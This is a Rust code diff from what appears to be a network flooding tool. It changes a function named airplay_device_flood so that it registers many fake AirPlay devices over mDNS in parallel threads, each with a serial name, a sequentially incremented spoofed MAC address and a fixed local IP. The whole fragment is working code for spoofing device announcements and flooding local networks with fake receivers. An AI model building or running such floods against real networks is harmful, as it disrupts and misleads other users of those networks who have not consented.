@@ -1,14 +1,26 @@
 use mdns_sd::{ServiceDaemon, ServiceInfo};
 use std::collections::HashMap;
 use std::time::Duration;
+use std::thread;
 
 use crate::utils;
 
 pub fn airplay_device_flood(name: &str, amount: usize) {
+    let mut threads = Vec::with_capacity(amount);
+
     let mut mac = utils::MacAddr::new_zeroed();
+    let name = name.to_string();
+    println!("{}", mac.as_string());
     for i in 0..amount {
         mac.increment();
-        let _ = register_airplay_device(&format!("{}{}", name, i), &mac, "192.168.0.1", 8000);
+        let mac_c = mac.clone();
+        let name_c = name.clone();
+        let t = thread::spawn(move || {let _ = register_airplay_device(&format!("{}{}", name_c, i), &mac_c, "192.168.4.100", 8000);});
+        threads.push(t);
+    }
+
+    for t in threads {
+        t.join();
     }
 }
 
@@ -107,7 +119,6 @@ fn create_raop_txt_records(device_name: &str, device_id: &str) -> HashMap<String
 // Not really sure if I could get any use from this?
 use std::io::{Read, Write};
 use std::net::TcpListener;
-use std::thread;
 
 fn start_airplay_http_server(port: u16) {
     let listener = TcpListener::bind(format!("0.0.0.0:{}", port)).unwrap();
